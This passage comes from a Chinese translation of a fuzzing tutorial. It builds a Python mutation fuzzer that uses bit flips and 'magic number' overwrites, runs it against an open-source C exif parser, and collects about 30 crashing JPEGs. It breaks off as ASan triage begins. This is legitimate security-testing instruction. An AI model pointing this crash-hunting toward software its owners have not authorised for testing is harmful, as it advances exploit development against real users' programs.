class="headerlink" title="Analyzing Mutation"></a>Analyzing Mutation</h2><p>如果我们跑我们的脚本，我们可以利用<code>shasum</code>这个输出，然后与原本的<code>JPEG</code>进行比较。</p><pre><code class="hljs reasonml">root@kali:~# shasum <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Canon_40D</span>.</span></span>jpg mutated.jpg c3d98686223ad69ea29c811aaab35d343ff1ae9e  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Canon_40D</span>.</span></span>jpga7b619028af3d8e5ac106a697b06efcde0649249  mutated.jpg</code></pre><p>这个看起来很有戏，因为它们现在有着不同的哈希值，我们未来通过用一个程序（被称为<a href="https://www.scootersoftware.com/">Beyond Compare</a>或<code>bcompare</code>）比较它们以进行分析，我们将会有着不同高亮的两个<code>hexdumps</code></p><p><img src="/img/fuzzing_like_a_caveman/bcompare.png" alt="bcompare.png"></p><p>正如你所是，在这一个屏幕的共享中，我们有着三个字节的不同，它们已经进行了它们的位翻转，这个初始的在左侧，而变异的样本在右侧。</p><p>这个变异的方法似乎起作用了，让我们继续实现我们第二个变异的方法。</p><h2 id="Gynvael’s-Magic-Numbers"><a href="#Gynvael’s-Magic-Numbers" class="headerlink" title="Gynvael’s Magic Numbers"></a>Gynvael’s Magic Numbers</h2><p>在前文提到的<code>GynvaelColdwind</code>的<a href="https://www.youtube.com/watch?v=BrDujogxYSk&t=2545">Basics of fuzzing’ stream</a>，他枚举了一些在程序上可以有着毁灭影响的<code>magic numbers</code>，通常，这些数字和数据类型大小和算数引起的错误有关，这些讨论的数字是：</p><ul><li>0xFF</li><li>0x7F</li><li>0x00</li><li>0xFFFF</li><li>0x0000</li><li>0xFFFFFFFF</li><li>0x00000000</li><li>0x80000000 &lt;—- minimum 32-bit int</li><li>0x40000000 &lt;—- just half of that amount</li><li>0x7FFFFFFF &lt;—- max 32-bit int</li></ul><p>如果在<code>malloc()</code>或其他类型的操作过程中对这些类型的值执行任何类型的算术运算，溢出可能就是很常见，例如如果你加<code>0x1</code>到<code>0xFF</code>在一个字节的寄存器上，它将转到<code>0x00</code>，这是无意的行为，<code>HEVD</code>实际上已经有一个与这个理念类似的整数溢出<code>bug</code>。</p><p>假设我们的<code>fuzzer</code>选择<code>0x7FFFFFFF</code>作为它想要使用的魔数，该值是4个字节长，所以我们必须在数组中找到一个字节索引，并覆盖该字节加上接下来的三个字节。让我们继续并开始在我们的<code>fuzzer</code>中实现它。</p><h2 id="Implementing-Mutation-Method-2"><a href="#Implementing-Mutation-Method-2" class="headerlink" title="Implementing Mutation Method #2"></a>Implementing Mutation Method #2</h2><p>首先我们将想要创建一个类似<code>Gynvael</code>做的一个元组列表，在这元组中的第一个数字是<code>magic numbers</code>的字节数，第二个数字是十进制上的字节的值。</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    print(picked_magic)</code></pre><p>如果我们跑这个脚本，我门就可以看到它随机在取一个<code>magic</code>值元组</p><pre><code class="hljs python3">root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 64)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 128)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 0)root@kali:~# python3 fuzzer.py Canon_40D.jpg (2, 255)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 0)</code></pre><p>我们现在需要用新的<code>magic</code>1到4字节的值复写到<code>JPEG</code>中的1到4字节的值上，我们将要建立我们可能的<code>indexes</code>就像之前那个方法一样，随机选择<code>index</code>然后覆盖这个<code>index</code>上的字节用我们<code>picked_magic</code>数字。</p><p>所以，如果例如我们取的是<code>(4, 128)</code>，我们知道这是4个字节，所以这个魔数是<code>0x80000000</code>，所以我们将做些类似如下的事情：</p><pre><code class="hljs python">byte[x] = <span class="hljs-number">128</span>byte[x+<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>byte[x+<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>byte[x+<span class="hljs-number">3</span>] = <span class="hljs-number">0</span></code></pre><p>总而言之，我们的函数如下所示：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    length = len(data) - <span class="hljs-number">8</span>    index = range(<span class="hljs-number">0</span>, length)    picked_index = random.choice(index)    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )</span>    <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFF</span>            data[picked_index] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7F</span>            data[picked_index] = <span class="hljs-number">127</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00</span>            data[picked_index] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x0000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFFFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00000000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">128</span>:<span class="hljs-comment"># 0x80000000</span>            data[picked_index] = <span class="hljs-number">128</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">64</span>:<span class="hljs-comment"># 0x40000000</span>            data[picked_index] = <span class="hljs-number">64</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7FFFFFFF</span>            data[picked_index] = <span class="hljs-number">127</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>            <span class="hljs-keyword">return</span> data</code></pre><h2 id="Analyzing-Mutation-2"><a href="#Analyzing-Mutation-2" class="headerlink" title="Analyzing Mutation #2"></a>Analyzing Mutation #2</h2><p>现在我们运行脚本，然后在<code>Beyond Compare</code>中分析结果，我们可以看到这个两个字节的<code>0xA6 0x76</code>将被复写成<code>0xFF 0xFF</code>。</p><p><img src="/img/fuzzing_like_a_caveman/bcompare2.png" alt="bcompare2.png"></p><p>这正是我们想实现的。</p><h2 id="Starting-to-Fuzz"><a href="#Starting-to-Fuzz" class="headerlink" title="Starting to Fuzz"></a>Starting to Fuzz</h2><p>现在我们有了两个可靠的编译数据的方法，我们需要做：</p><ul><li>用我们的函数的其中一个变异数据</li><li>用变异的数据创建一个新的图片</li><li>把变异的图片喂给我们的二进制用于解析</li><li>捕获任何<code>Segmentation faults</code>并且<code>log</code>产生这个的图片</li></ul><h3 id="Victim"><a href="#Victim" class="headerlink" title="Victim?"></a>Victim?</h3><p>对于我们的受害者程序，我们将用<code>site:github.com &quot;exif&quot; language:c</code>搜索<code>Google</code>，以找到用 C 编写的引用了<code>exif</code>的<code>Github</code>项目。</p><p>快速浏览将我们带到<code>https://github.com/mkttanabe/exif</code></p><p>我们可以通过<code>git cloning</code>这个仓库和用<code>README</code>中的<code>building with gcc</code>指令来安装该程序（我已经把编译好的二进制文件放到了<code>/usr/bin</code>，仅仅是为了方便）</p><p>让我们先来看看这个程序怎么处理我们合规的<code>JPEG</code>吧。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# exif Canon_40D.jpg -verbosesystem: little-endian  data: little-endian[Canon_40D.jpg] createIfdTableArray: result=<span class="hljs-number">5</span>&#123;<span class="hljs-number">0</span>TH IFD&#125; tags=<span class="hljs-number">11</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x010F</span> Make        type=<span class="hljs-number">2</span> count=<span class="hljs-number">6</span> val=[Canon]tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x0110</span> Model        type=<span class="hljs-number">2</span> count=<span class="hljs-number">14</span> val=[Canon EOS <span class="hljs-number">40</span>D]tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x0112</span> Orientation        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x011A</span> XResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x011B</span> YResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x0128</span> ResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">06</span>] <span class="hljs-number">0x0131</span> Software        type=<span class="hljs-number">2</span> count=<span class="hljs-number">11</span> val=[GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>]tag[<span class="hljs-number">07</span>] <span class="hljs-number">0x0132</span> DateTime        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>]tag[<span class="hljs-number">08</span>] <span class="hljs-number">0x0213</span> YCbCrPositioning        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">09</span>] <span class="hljs-number">0x8769</span> ExifIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">214</span> tag[<span class="hljs-number">10</span>] <span class="hljs-number">0x8825</span> GPSInfoIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">978</span> &#123;EXIF IFD&#125; tags=<span class="hljs-number">30</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x829A</span> ExposureTime        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span>/<span class="hljs-number">160</span> tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x829D</span> FNumber        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">71</span>/<span class="hljs-number">10</span> tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x8822</span> ExposureProgram        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x8827</span> PhotographicSensitivity        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">100</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x9000</span> ExifVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x9003</span> DateTimeOriginal        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]tag[<span class="hljs-number">06</span>] <span class="hljs-number">0x9004</span> DateTimeDigitized        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]tag[<span class="hljs-number">07</span>] <span class="hljs-number">0x9101</span> ComponentsConfiguration        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0x01</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> tag[<span class="hljs-number">08</span>] <span class="hljs-number">0x9201</span> ShutterSpeedValue        type=<span class="hljs-number">10</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">483328</span>/<span class="hljs-number">65536</span> tag[<span class="hljs-number">09</span>] <span class="hljs-number">0x9202</span> ApertureValue        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">368640</span>/<span class="hljs-number">65536</span> tag[<span class="hljs-number">10</span>] <span class="hljs-number">0x9204</span> ExposureBiasValue        type=<span class="hljs-number">10</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">11</span>] <span class="hljs-number">0x9207</span> MeteringMode        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">5</span> tag[<span class="hljs-number">12</span>] <span class="hljs-number">0x9209</span> Flash        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">9</span> tag[<span class="hljs-number">13</span>] <span class="hljs-number">0x920A</span> FocalLength        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">135</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">14</span>] <span class="hljs-number">0x9286</span> UserComment        type=<span class="hljs-number">7</span> count=<span class="hljs-number">264</span> val=<span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> (omitted)tag[<span class="hljs-number">15</span>] <span class="hljs-number">0x9290</span> SubSecTime        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">16</span>] <span class="hljs-number">0x9291</span> SubSecTimeOriginal        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">17</span>] <span class="hljs-number">0x9292</span> SubSecTimeDigitized        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">18</span>] <span class="hljs-number">0xA000</span> FlashPixVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> tag[<span class="hljs-number">19</span>] <span class="hljs-number">0xA001</span> ColorSpace        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">20</span>] <span class="hljs-number">0xA002</span> PixelXDimension        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">100</span> tag[<span class="hljs-number">21</span>] <span class="hljs-number">0xA003</span> PixelYDimension        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">68</span> tag[<span class="hljs-number">22</span>] <span class="hljs-number">0xA005</span> InteroperabilityIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">948</span> tag[<span class="hljs-number">23</span>] <span class="hljs-number">0xA20E</span> FocalPlaneXResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">3888000</span>/<span class="hljs-number">876</span> tag[<span class="hljs-number">24</span>] <span class="hljs-number">0xA20F</span> FocalPlaneYResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2592000</span>/<span class="hljs-number">583</span> tag[<span class="hljs-number">25</span>] <span class="hljs-number">0xA210</span> FocalPlaneResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">26</span>] <span class="hljs-number">0xA401</span> CustomRendered        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> tag[<span class="hljs-number">27</span>] <span class="hljs-number">0xA402</span> ExposureMode        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">28</span>] <span class="hljs-number">0xA403</span> WhiteBalance        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> tag[<span class="hljs-number">29</span>] <span class="hljs-number">0xA406</span> SceneCaptureType        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span> &#123;Interoperability IFD&#125; tags=<span class="hljs-number">2</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0001</span> InteroperabilityIndex        type=<span class="hljs-number">2</span> count=<span class="hljs-number">4</span> val=[R98]tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x0002</span> InteroperabilityVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> &#123;GPS IFD&#125; tags=<span class="hljs-number">1</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0000</span> GPSVersionID        type=<span class="hljs-number">1</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> &#123;<span class="hljs-number">1</span>ST IFD&#125; tags=<span class="hljs-number">6</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x0103</span> Compression        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">6</span> tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x011A</span> XResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x011B</span> YResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x0128</span> ResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x0201</span> JPEGInterchangeFormat        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1090</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x0202</span> JPEGInterchangeFormatLength        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1378</span> <span class="hljs-number">0</span>th IFD : Model = [Canon EOS <span class="hljs-number">40</span>D]Exif IFD : DateTimeOriginal = [<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]</code></pre><p>我们可以看到这个程序解析出<code>tags</code>并说明与它们相关联的字节值，这正是我们想要找到的。</p><h3 id="Chasing-Segfaults"><a href="#Chasing-Segfaults" class="headerlink" title="Chasing Segfaults"></a>Chasing Segfaults</h3><p>理想情况下，我们将会喂给这个程序一些变异的数据，然后得到<code>segfault</code>，意味着我们已找到了<code>bug</code>。我遇到的问题是当我为了<code>Segmentation fault</code>消息监控<code>stdout</code>和<code>sterr</code>是，它从未出现，这是因为<code>Segmentation fault</code>消息是来自我们的命令行<code>shell</code>而不是二进制，这意味着<code>shell</code>收到一个<code>SIGSEGV</code>信号，并且会反馈打印这个信息。</p><p>我发现监控这个的有一种方法用<code>pexpect Python module</code>的<code>use()</code>方法和<code>pipes Python module</code>的<code>quote()</code>方法。</p><p>我们将加一个新的函数，这个将输入<code>counter</code>作为参数，这个参数为我们<code>fuzzer</code>迭代的轮数，另外一个参数是变异的数据，如果我们看到<code>Segmentation</code>在我们<code>run()</code>指令的输出里面，我们将把这个变异的数据写入文件并保存，这样我们就可以有让二进制<code>crash</code>的<code>JPEG</code>图片了。</p><p>让我们创建一个新的称为<code>crashes</code>文件夹，然后我们将在这里面保存<code>JPEGs</code>，这些导致<code>crashes</code>的图片将会以<code>crash.&lt;fuzzing iteration (counter)&gt;.jpg</code>的格式保存，所以如果这个<code>fuzzing</code>迭代了100次导致了<code>a crash</code>，我们应该会得到这样的文件：<code>/crashes/crash.100.jpg</code></p><p>我们将持续以保持每100次模糊测试迭代的计数打印到终端的同一行，我们的函数如下所示：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    command = <span class="hljs-string">&quot;exif mutated.jpg -verbose&quot;</span>    out, returncode = run(<span class="hljs-string">&quot;sh -c &quot;</span> + quote(command), withexitstatus=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Segmentation&quot;</span> <span class="hljs-keyword">in</span> out:        f = open(<span class="hljs-string">&quot;crashes/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)    <span class="hljs-keyword">if</span> counter % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:        print(counter, end=<span class="hljs-string">&quot;\r&quot;</span>)</code></pre><p>接下来，我们将在我们代码的最下面替换我们执行的<code>stub</code>以跑一个计数器，一旦我们达到了<code>1000</code>次迭代，我们就停止<code>fuzzing</code>，我们也将让我们的<code>fuzzer</code>随机选择一个我们变异的方法，所以它或使用位翻转或使用魔数，让我们运行它，然后在结束时检测我们的<code>crashes</code>文件夹。</p><p>当<code>fuzzer</code>结束后，你可以看到我们获得了大概<code>30</code>个<code>crashes</code>。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes# lscrash<span class="hljs-number">.102</span>.jpg  crash<span class="hljs-number">.317</span>.jpg  crash<span class="hljs-number">.52</span>.jpg   crash<span class="hljs-number">.620</span>.jpg  crash<span class="hljs-number">.856</span>.jpgcrash<span class="hljs-number">.129</span>.jpg  crash<span class="hljs-number">.324</span>.jpg  crash<span class="hljs-number">.551</span>.jpg  crash<span class="hljs-number">.694</span>.jpg  crash<span class="hljs-number">.861</span>.jpgcrash<span class="hljs-number">.152</span>.jpg  crash<span class="hljs-number">.327</span>.jpg  crash<span class="hljs-number">.559</span>.jpg  crash<span class="hljs-number">.718</span>.jpg  crash<span class="hljs-number">.86</span>.jpgcrash<span class="hljs-number">.196</span>.jpg  crash<span class="hljs-number">.362</span>.jpg  crash<span class="hljs-number">.581</span>.jpg  crash<span class="hljs-number">.775</span>.jpg  crash<span class="hljs-number">.984</span>.jpgcrash<span class="hljs-number">.252</span>.jpg  crash<span class="hljs-number">.395</span>.jpg  crash<span class="hljs-number">.590</span>.jpg  crash<span class="hljs-number">.785</span>.jpg  crash<span class="hljs-number">.985</span>.jpgcrash<span class="hljs-number">.285</span>.jpg  crash<span class="hljs-number">.44</span>.jpg   crash<span class="hljs-number">.610</span>.jpg  crash<span class="hljs-number">.84</span>.jpg   crash<span class="hljs-number">.987</span>.jpg</code></pre><p>我们现在可以用一行快速的代码证实这个结果：<code>root@kali:~/crashes# for i in *.jpg; do exif &quot;$i&quot; -verbose &gt; /dev/null 2&gt;&amp;1; done</code> ，记住我们可以将<code>STDOUT</code>和<code>STDERR</code>都导向<code>/dev/null</code>，因为<code>Segmentation fault</code>是来自<code>shell</code>，而不是来自二进制文件。</p><p>我们跑上面这指令，以下为输出：</p><pre><code class="hljs properties"><span class="hljs-meta">root@kali</span>:<span class="hljs-string">~/crashes# for i in *.jpg; do exif &quot;$i&quot; -verbose &gt; /dev/null 2&gt;&amp;1; done</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">Segmentation</span> <span class="hljs-string">fault</span><span class="hljs-attr">-----SNIP-----</span></code></pre><p>你不可以看到它们的所有，但是这里确实有30个<code>segfaults</code>，所以所有的事情都似乎按照计划的进行。</p><h2 id="Triaging-Crashes"><a href="#Triaging-Crashes" class="headerlink" title="Triaging Crashes"></a>Triaging Crashes</h2><p>现在我们有大约30个<code>crashes</code>和导致<code>crashes</code>的<code>JPEGs</code>，下一步是分析这些<code>crahes</code>并找出其中它们有多少是<code>unique</code>，在这里我们可以用一些我们看<code>Brandon Faulk</code>的视频学到的东西，用<code>Beyond Compare</code>快速看一遍<code>crash</code>的样本，我们发现大部分都是因为我们的<code>bit_flip()</code>变异而不是<code>magic()</code>变异方法产生的，这很有趣，作为测试，当我们运行的过程中，我们可以关闭函数选择的随机性，只使用<code>magic()</code>变异方式运行100000次迭代，再看看我们是否会遇到任何<code>crahes</code></p><h2 id="Using-ASan-to-Analyze-Crashes"><a href="#Using-ASan-to-Analyze-Crashes" class="headerlink" title="Using ASan to Analyze Crashes"></a>Using ASan to Analyze Crashes</h2><p><code>ASan</code>是<code>Address 